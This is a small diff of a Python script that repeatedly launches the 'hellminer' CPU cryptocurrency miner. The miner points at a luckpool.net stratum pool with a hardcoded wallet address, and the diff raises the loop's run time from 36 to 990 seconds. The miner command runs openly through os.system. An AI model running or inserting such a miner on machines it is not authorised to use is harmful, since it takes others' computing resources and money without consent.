@@ -16,7 +16,7 @@ def acion():
     os.system("./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RFG7WJYadVbox1QBGGkt1eCbA8g9TxMha4.cpu1 -p x --cpu 2")
 
 
-max_time = 36
+max_time = 990
 start_time = time.time()  # remember when we started
 while (time.time() - start_time) < max_time:
     acion()
